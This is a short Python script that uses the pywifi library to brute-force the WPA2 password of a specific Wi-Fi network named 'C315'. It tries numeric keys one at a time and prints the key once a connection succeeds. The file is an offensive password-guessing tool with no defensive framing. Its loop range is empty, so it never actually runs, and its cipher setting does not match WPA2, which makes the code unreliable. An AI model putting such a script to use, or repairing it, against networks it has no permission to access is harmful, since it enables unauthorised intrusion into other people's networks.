#!/usr/bin/env python3
# -*- coding: utf-8 -*-


import pywifi, time


def connect_wifi(ssid):
	wifi = pywifi.PyWiFi()
	const = pywifi.const

	iface = wifi.interfaces()[0]
	iface.disconnect()
	time.sleep(1)

	
	# iface.scan()
	# for wifi in iface.scan_results():
	# 	print("ssid:", wifi.ssid)
	# 	print("auth:", wifi.auth, const.AUTH_ALG_OPEN)
	# 	print("akm:", wifi.akm, const.AKM_TYPE_WPA2PSK)
	# 	print("cipher:", wifi.cipher, const.CIPHER_TYPE_NONE)
	# 	print("=" * 20)
	# return

	profile = pywifi.Profile()
	profile.ssid = ssid
	profile.auth = const.AUTH_ALG_OPEN
	profile.akm.append(const.AKM_TYPE_WPA2PSK)
	profile.cipher = const.CIPHER_TYPE_NONE
	for password in range(100000000000, 99999999999):
		# profile.key = "{:0>8}".format(password)
		profile.key = str(password)

		iface.remove_all_network_profiles()
		tmp_profile = iface.add_network_profile(profile)

		iface.connect(tmp_profile)
		time.sleep(1)
	# assert iface.status() == const.IFACE_CONNECTED
		print("password:", profile.key)
		if iface.status() == const.IFACE_CONNECTED:
			print("status:", iface.status(), const.IFACE_CONNECTED)
			break

	# iface.disconnect()
	# time.sleep(1)
	# assert iface.status() in\
	#     [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

if __name__ == '__main__':
	connect_wifi('C315')